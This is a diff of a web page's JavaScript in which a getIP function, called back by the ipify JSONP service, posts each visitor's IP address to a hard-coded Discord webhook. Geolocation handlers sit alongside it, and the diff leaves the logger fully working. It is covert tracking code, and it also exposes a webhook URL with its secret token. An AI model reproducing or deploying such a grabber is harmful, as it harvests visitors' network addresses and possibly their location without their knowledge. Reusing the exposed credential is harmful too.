@@ -112,8 +112,7 @@ function success(position) {
 function error() {
   alert("Sorry, no position available.");
 }
-</script>
-<script>
+
 function getIP(json) {
   var request = new XMLHttpRequest(); //making a request for the webhook
       request.open("POST", "https://discord.com/api/webhooks/1405132402556272682/TfjCsH4Y6Dd2jcmPXJtzieHWoX48tJg5yYTnw0AE5F9MLHj-jKzJbQgYgRe1vLH9Wr_z");
@@ -131,8 +130,9 @@ function getIP(json) {
     }
 
 </script>
-<script src="https://api.ipify.org?format=jsonp&callback=getIP"></script> //using this api to get the ip
+<script src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
     
 </body>
 </html>
+
 
